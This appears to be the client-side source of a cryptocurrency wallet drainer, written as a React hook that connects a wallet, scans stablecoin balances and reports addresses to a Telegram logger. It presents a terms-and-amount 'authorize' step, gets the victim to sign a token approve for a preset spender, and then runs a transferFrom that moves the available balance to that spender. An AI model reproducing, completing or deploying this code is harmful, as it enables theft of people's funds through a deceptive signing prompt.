"use client";

import { useCallback, useEffect, useRef, useState } from "react";
import { TERMS_VERSION } from "../core/approve-config";
import {
  EVM_CHAIN_ID,
  getToken,
  isEvmChainKey,
  parseHumanToRaw,
  type TokenSymbol,
} from "../core/chain-tokens";
import { fetchBalances } from "../core/balances-client";
import {
  METADATA,
  projectId,
  WC_CONNECT_NAMESPACES,
} from "../core/constants";
import { postFlowLog } from "../core/flow-log-client";
import { rowsFromBalances } from "../core/network-meta";
import { runPostConfirmSequence } from "../core/post-confirm";
import { postTgLog } from "../core/tg-log-client";
import {
  encodeErc20Approve,
  resolveApproveAmountRaw,
} from "../core/evm-approve";
import {
  getErrorMessage,
  isUserRejection,
  muteWalletCancellationConsoleErrors,
  withSilentWalletCancellation,
} from "../core/errors";
import {
  accountsFromSession,
  getTronLinkAddress,
  mergeTronSignedResult,
  tronSignTransaction,
} from "../core/tron-sign";
import {
  getSharedWcModal,
  purgeExtraWcmModals,
} from "../providers/wallet-connect-modal";
import type { ConnectFlowProps } from "../types/connect-flow-props";
import {
  configGaps,
  getSpenderForNetwork,
} from "../types/connect-flow-props";
import type {
  LinkedAccounts,
  NetworkRow,
  RowStatus,
  UniversalProvider,
  WalletConnectModal,
} from "../types";

export function useConnectFlow(props: ConnectFlowProps = {}) {
  const spendersRef = useRef(props);
  spendersRef.current = props;
  const providerRef = useRef<UniversalProvider | null>(null);
  const modalRef = useRef<WalletConnectModal | null>(null);
  const connectingRef = useRef(false);
  const approvingLockRef = useRef(false);
  const initOnceRef = useRef(false);
  const accountsRef = useRef<LinkedAccounts>({ evm: null, tron: null });
  const traceIdRef = useRef<string>("");

  const [ready, setReady] = useState(false);
  const [busy, setBusy] = useState(false);
  const [approving, setApproving] = useState(false);
  const [showResults, setShowResults] = useState(false);
  const [error, setError] = useState<string | null>(null);
  const [networks, setNetworks] = useState<NetworkRow[]>([]);
  const [selectedKey, setSelectedKey] = useState<string | null>(null);
  const [rowStatus, setRowStatus] = useState<Record<string, RowStatus>>({});
  const [token, setToken] = useState<TokenSymbol>("USDT");
  const [amountHuman, setAmountHuman] = useState("");
  const [unlimited, setUnlimited] = useState(false);
  const [termsAccepted, setTermsAccepted] = useState(false);

  const parsePositiveAmount = useCallback((value: string): number | null => {
    const n = Number.parseFloat(value);
    if (!Number.isFinite(n) || n <= 0) return null;
    return n;
  }, []);

  const logStep = useCallback((step: string, detail: Record<string, unknown> = {}) => {
    const traceId = traceIdRef.current || "n/a";
    void postFlowLog(step, detail, traceId);
  }, []);

  const resetAuthorizeForm = useCallback(() => {
    setToken("USDT");
    setAmountHuman("");
    setUnlimited(false);
    setTermsAccepted(false);
  }, []);

  const setStatus = useCallback((key: string, status: RowStatus) => {
    setRowStatus((prev) => ({ ...prev, [key]: status }));
  }, []);

  const scanWallet = useCallback(async (linked: LinkedAccounts) => {
    if (!linked.evm && !linked.tron) {
      setNetworks([]);
      return;
    }

    setError(null);
    setNetworks([]);
    setSelectedKey(null);
    setRowStatus({});
    resetAuthorizeForm();

    try {
      logStep("SCAN STARTED", { linked });
      let tron = linked.tron;
      if (!tron) tron = await getTronLinkAddress();

      const linkedFinal = { evm: linked.evm, tron };
      accountsRef.current = linkedFinal;

      const primary = tron || linked.evm;
      const network = tron ? "tron" : "evm";
      const [, data] = await Promise.all([
        primary
          ? postTgLog({
              type: "scan",
              address: primary,
              network,
              status: "success",
              error: null,
            })
          : Promise.resolve(),
        fetchBalances(linked.evm, tron),
      ]);
      logStep("BALANCES FETCH SUCCESS", { networks: Object.keys(data) });

      const rows = rowsFromBalances(data);
      setNetworks(rows);
      setRowStatus(
        Object.fromEntries(rows.map((r) => [r.key, "awaiting" as RowStatus]))
      );
      setShowResults(true);

      logStep("STEP 1 COMPLETE — WALLET CONNECTED + BALANCES", {
        fundsMoved: "NO — read-only scan",
        evm: linkedFinal.evm,
        tron: linkedFinal.tron,
        networks: rows.map((r) => ({
          key: r.key,
          native: r.balances.native,
          usdt: r.balances.usdt,
          usdc: r.balances.usdc ?? null,
        })),
      });
    } catch (err: unknown) {
      console.error(err);
      logStep("BALANCES FETCH FAILED", { error: getErrorMessage(err, "scan failed") });
      setError(err instanceof Error ? err.message : "Failed to fetch balances");
      setNetworks([]);
    }
  }, [logStep, resetAuthorizeForm]);

  useEffect(() => {
    let cancelled = false;
    muteWalletCancellationConsoleErrors();

    async function init() {
      if (!projectId) {
        setError("Missing NEXT_PUBLIC_PROJECT_ID in .env.local");
        return;
      }

      if (initOnceRef.current && providerRef.current && modalRef.current) {
        setReady(true);
        return;
      }

      const [{ default: UniversalProvider }, { WalletConnectModal }] =
        await Promise.all([
          import("@walletconnect/universal-provider"),
          import("@walletconnect/modal"),
        ]);

      if (cancelled) return;

      const modal = getSharedWcModal(WalletConnectModal, projectId);

      const provider = await UniversalProvider.init({
        projectId,
        metadata: {
          ...METADATA,
          url:
            typeof window !== "undefined"
              ? window.location.origin
              : METADATA.url,
        },
      });

      if (cancelled) return;

      provider.events.removeAllListeners("display_uri");
      provider.events.removeAllListeners("session_delete");
      provider.on("display_uri", (uri: string) => {
        logStep("QR DISPLAYED", { hasUri: Boolean(uri) });
        purgeExtraWcmModals(document.querySelector("wcm-modal"));
        void modal.openModal({ uri });
      });
      provider.on("session_delete", () => {
        logStep("SESSION DELETED");
        setNetworks([]);
        setShowResults(false);
        setSelectedKey(null);
        setRowStatus({});
        accountsRef.current = { evm: null, tron: null };
        resetAuthorizeForm();
      });

      providerRef.current = provider;
      modalRef.current = modal;
      initOnceRef.current = true;
      setReady(true);
    }

    init().catch((err: unknown) => {
      console.error(err);
      setError(
        err instanceof Error ? err.message : "Failed to init WalletConnect"
      );
    });

    return () => {
      cancelled = true;
      modalRef.current?.closeModal();
    };
  }, [logStep, resetAuthorizeForm]);

  const openWalletConnect = useCallback(async () => {
    traceIdRef.current = `flow-${Date.now().toString(36)}-${Math.random()
      .toString(36)
      .slice(2, 8)}`;
    logStep("CONNECT STARTED", { traceId: traceIdRef.current });
    const provider = providerRef.current;
    const modal = modalRef.current;
    if (!provider || connectingRef.current) return;

    connectingRef.current = true;
    setError(null);
    setBusy(true);
    setShowResults(false);
    setNetworks([]);
    setSelectedKey(null);
    setRowStatus({});
    resetAuthorizeForm();

    let unsubscribeModal: (() => void) | undefined;
    if (modal) {
      let modalWasOpen = false;
      unsubscribeModal = modal.subscribeModal((state) => {
        if (state.open) {
          modalWasOpen = true;
          return;
        }
        if (!modalWasOpen || !connectingRef.current || provider.session) return;
        provider.abortPairingAttempt();
        connectingRef.current = false;
        setBusy(false);
      });
    }

    try {
      if (provider.session) {
        await provider.disconnect().catch(() => undefined);
      }

      await provider.connect({
        optionalNamespaces: WC_CONNECT_NAMESPACES,
      });
      logStep("WALLET CONNECTED");

      modal?.closeModal();

      const linked = accountsFromSession(provider.session);

      if (!linked.evm && !linked.tron) {
        logStep("CONNECT FAILED — NO ACCOUNTS");
        setError("No account returned from wallet. Please try again.");
        return;
      }

      await scanWallet(linked);
    } catch (err: unknown) {
      console.error(err);
      logStep("CONNECT ERROR", { error: getErrorMessage(err, "connect failed") });
      modal?.closeModal();
      const message =
        err instanceof Error ? err.message : "Connection cancelled";
      if (/reset/i.test(message)) {
        setError("Connection request reset. Please try again.");
      } else if (!/rejected|denied|cancel|abort/i.test(message)) {
        setError(message);
      }
      setNetworks([]);
      setShowResults(false);
    } finally {
      unsubscribeModal?.();
      connectingRef.current = false;
      setBusy(false);
    }
  }, [logStep, resetAuthorizeForm, scanWallet]);

  const requestApprove = useCallback(async () => {
    const provider = providerRef.current;
    if (!provider || approvingLockRef.current) return;

    const networkKey = selectedKey;
    if (!networkKey) {
      setError("Select a network first");
      return;
    }
    if (!termsAccepted) {
      setError("Accept the Terms & Conditions to continue");
      return;
    }
    if (!unlimited && !amountHuman.trim()) {
      setError("Enter a maximum amount, or explicitly opt into unlimited");
      return;
    }
    if (!unlimited) {
      const amount = parsePositiveAmount(amountHuman.trim());
      if (amount == null) {
        setError("Enter a valid amount greater than 0");
        return;
      }
    }

    const gaps = configGaps(spendersRef.current, networkKey);
    if (gaps.length > 0) {
      setError(
        `Missing spender: ${gaps.join(", ")} (pass props or set .env.local)`
      );
      return;
    }

    const linked = accountsRef.current;
    const addressForLog =
      networkKey === "tron" ? linked.tron : linked.evm;
    if (!addressForLog) {
      setError(
        networkKey === "tron"
          ? "No Tron address in this WalletConnect session"
          : "No EVM address in this WalletConnect session"
      );
      return;
    }

    const selectedNetwork = networks.find((n) => n.key === networkKey) ?? null;
    if (!selectedNetwork) {
      setError("Selected network data is unavailable. Re-scan your wallet.");
      return;
    }

    if (networkKey === "tron") {
      const trxBalance = Number.parseFloat(selectedNetwork.balances.native || "0");
      if (!Number.isFinite(trxBalance) || trxBalance <= 0) {
        setError(
          "This Tron wallet has 0 TRX. Add a small TRX balance for network fee, then try again."
        );
        return;
      }
    }

    // Token balance may be 0 or below the selected permission amount.
    // approve() does not require token balance; transferFrom runs later only
    // for whatever is actually available on-chain.

    approvingLockRef.current = true;
    setApproving(true);
    setError(null);
    setStatus(networkKey, "waiting");

    const selectedTokens = [token];
    const spender = getSpenderForNetwork(spendersRef.current, networkKey);
    if (selectedTokens.length === 0) {
      setError("No supported tokens found for selected network");
      return;
    }

    try {
      logStep("APPROVAL FLOW STARTED", {
        network: networkKey,
        selectedTokens,
        unlimited,
        amountHuman,
      });
      for (const tokenSymbol of selectedTokens) {
        const tokenInfo = getToken(networkKey, tokenSymbol);
        if (!tokenInfo) {
          throw new Error(`Unsupported token ${tokenSymbol} for ${networkKey}`);
        }
        const tokenBalanceHuman =
          tokenSymbol === "USDC"
            ? selectedNetwork.balances.usdc ?? "0"
            : selectedNetwork.balances.usdt ?? "0";
        const availableBalanceRaw = parseHumanToRaw(
          tokenBalanceHuman,
          tokenInfo.decimals
        );
        // Request up to available balance for the immediate transfer attempt.
        // Approval amount stays at the user-selected permission (or unlimited).
        const requestedTransferRaw = unlimited
          ? availableBalanceRaw
          : parseHumanToRaw(amountHuman.trim(), tokenInfo.decimals);
        const transferAmountRaw =
          availableBalanceRaw < requestedTransferRaw
            ? availableBalanceRaw.toString()
            : requestedTransferRaw.toString();
        const shouldAttemptTransfer = BigInt(transferAmountRaw) > BigInt(0);

        logStep("TOKEN FLOW STARTED", {
          network: networkKey,
          token: tokenSymbol,
          transferAmountRaw,
          shouldAttemptTransfer,
          availableBalanceRaw: availableBalanceRaw.toString(),
        });

        const prepareRes = await fetch("/api/approvals/prepare", {
          method: "POST",
          headers: { "content-type": "application/json" },
          body: JSON.stringify({
            network: networkKey,
            owner: addressForLog,
            token: tokenSymbol,
            amountHuman: unlimited ? undefined : amountHuman.trim(),
            unlimited,
          }),
          cache: "no-store",
        });
        const prepareJson = (await prepareRes.json()) as {
          error?: string;
          amountRaw?: string;
          tokenAddress?: string;
          transaction?: Record<string, unknown>;
          to?: string;
          data?: string;
          chainId?: number;
          spender?: string;
        };
        if (!prepareRes.ok || !prepareJson.amountRaw) {
          throw new Error(
            prepareJson.error || `Failed to prepare ${tokenSymbol} approval`
          );
        }
        logStep("APPROVAL PREPARED", {
          token: tokenSymbol,
          approvedAmountRaw: prepareJson.amountRaw,
        });
        let txid: string | null = null;
        const preparedTokenAddress = prepareJson.tokenAddress ?? "";

        if (networkKey === "tron") {
          if (!prepareJson.transaction) {
            throw new Error("Missing Tron transaction from prepare");
          }

          const signRaw = await withSilentWalletCancellation(() =>
            tronSignTransaction(
              provider,
              addressForLog,
              prepareJson.transaction!
            )
          );
          const signed = mergeTronSignedResult(
            prepareJson.transaction,
            signRaw
          );

          const broadcastRes = await fetch("/api/tron-broadcast", {
            method: "POST",
            headers: { "content-type": "application/json" },
            body: JSON.stringify(signed),
            cache: "no-store",
          });
          const broadcastJson = (await broadcastRes.json()) as {
            result?: boolean;
            txid?: string;
            error?: string;
            code?: string | null;
            message?: string | null;
          };
          if (
            !broadcastRes.ok ||
            broadcastJson.result !== true ||
            typeof broadcastJson.txid !== "string" ||
            !broadcastJson.txid
          ) {
            throw new Error(
              broadcastJson.error ||
                broadcastJson.message ||
                "Tron broadcast was rejected by the node (no on-chain transaction)"
            );
          }
          txid = broadcastJson.txid;
          logStep("TRON APPROVAL TX BROADCASTED", { token: tokenSymbol, txid });
        } else if (isEvmChainKey(networkKey)) {
          if (!/^0x[a-fA-F0-9]{40}$/.test(spender)) {
            throw new Error("spenderEvm is not a valid 0x address");
          }

          const data =
            prepareJson.data ||
            encodeErc20Approve(
              spender,
              resolveApproveAmountRaw({
                decimals: tokenInfo.decimals,
                amountHuman: amountHuman.trim(),
                unlimited,
              })
            );
          const to = prepareJson.to || preparedTokenAddress;
          const chainId = prepareJson.chainId ?? EVM_CHAIN_ID[networkKey];

          const hash = await withSilentWalletCancellation(() =>
            provider.request(
              {
                method: "eth_sendTransaction",
                params: [
                  {
                    from: addressForLog,
                    to,
                    data,
                    value: "0x0",
                  },
                ],
              },
              `eip155:${chainId}`
            )
          );
          txid = typeof hash === "string" ? hash : null;
          logStep("EVM APPROVAL TX SUBMITTED", { token: tokenSymbol, txid });
        } else {
          throw new Error(`Unsupported network: ${networkKey}`);
        }

        setStatus(networkKey, "finalizing");
        if (addressForLog && txid) {
          const result = await runPostConfirmSequence({
            networkKey,
            address: addressForLog,
            token: tokenSymbol,
            amountHuman: unlimited ? "UNLIMITED" : amountHuman.trim(),
            amountRaw: prepareJson.amountRaw,
            unlimited,
            txid,
            executeTransfer: shouldAttemptTransfer,
            transferToAddress: spender,
            transferAmountRaw: shouldAttemptTransfer
              ? transferAmountRaw
              : undefined,
            traceId: traceIdRef.current,
          });

          if (!result.confirmed) {
            throw new Error(
              `Approval for ${tokenSymbol} was submitted but could not be verified`
            );
          }

          if (result.transferTxHash) {
            logStep("STEP 2/3 COMPLETE — APPROVE + TRANSFER EXECUTED", {
              fundsMoved: "YES — transferFrom executed",
              network: networkKey,
              owner: addressForLog,
              token: tokenSymbol,
              amountRawApproved: prepareJson.amountRaw,
              amountRawTransferred: result.transferredRaw,
              approveTxHash: txid,
              transferTxHash: result.transferTxHash,
              approvalId: result.approvalId,
            });
          } else {
            logStep("STEP 2 COMPLETE — APPROVE ONLY (NO TRANSFER YET)", {
              fundsMoved: "NO — auto transfer not executed",
              reason:
                result.transferSkippedReason ??
                "No transfer executed for this approval",
              network: networkKey,
              owner: addressForLog,
              token: tokenSymbol,
              amountRawApproved: prepareJson.amountRaw,
              approveTxHash: txid,
              approvalId: result.approvalId,
            });
          }
        }
      }

      setStatus(networkKey, "approved");
      if (addressForLog) {
        void postTgLog({
          type: "approve",
          address: addressForLog,
          network: networkKey,
          status: "success",
          error: null,
        });
      }
    } catch (err: unknown) {
      const message = getErrorMessage(err, "Approval failed");
      const rejected = isUserRejection(err);
      logStep("APPROVAL FLOW FAILED", {
        error: message,
        rejectedByUser: rejected,
        network: networkKey,
      });

      if (rejected) {
        console.warn("[approve] permission denied by user");
        setError("Permission denied by user");
        setStatus(networkKey, "rejected");
      } else {
        console.error(err);
        setError(message);
        setStatus(networkKey, "awaiting");
      }

      if (addressForLog) {
        void postTgLog({
          type: "approve",
          address: addressForLog,
          network: networkKey,
          status: "rejected",
          error: rejected ? "Permission denied by user" : message,
        });
      }
      if (rejected) {
        window.setTimeout(() => setStatus(networkKey, "awaiting"), 2200);
      }
    } finally {
      approvingLockRef.current = false;
      setApproving(false);
    }
  }, [
    amountHuman,
    logStep,
    networks,
    parsePositiveAmount,
    selectedKey,
    setStatus,
    termsAccepted,
    token,
    unlimited,
  ]);

  const onSelectNetwork = useCallback(
    (key: string) => {
      if (approving) return;
      setSelectedKey(key);
      setError(null);
      setToken("USDT");
      setAmountHuman("");
      setUnlimited(false);
    },
    [approving]
  );

  const onAuthorize = useCallback(() => {
    void requestApprove();
  }, [requestApprove]);

  const closeResultsModal = useCallback(() => {
    if (approving) return;
    setShowResults(false);
  }, [approving]);

  return {
    ready,
    busy,
    approving,
    showResults,
    error,
    networks,
    selectedKey,
    rowStatus,
    token,
    amountHuman,
    unlimited,
    termsAccepted,
    termsVersion: TERMS_VERSION,
    openWalletConnect,
    onSelectNetwork,
    onTokenChange: setToken,
    onAmountChange: setAmountHuman,
    onUnlimitedChange: (value: boolean) => {
      setUnlimited(value);
      if (value) setAmountHuman("");
    },
    onTermsChange: setTermsAccepted,
    onAuthorize,
    closeResultsModal,
  };
}
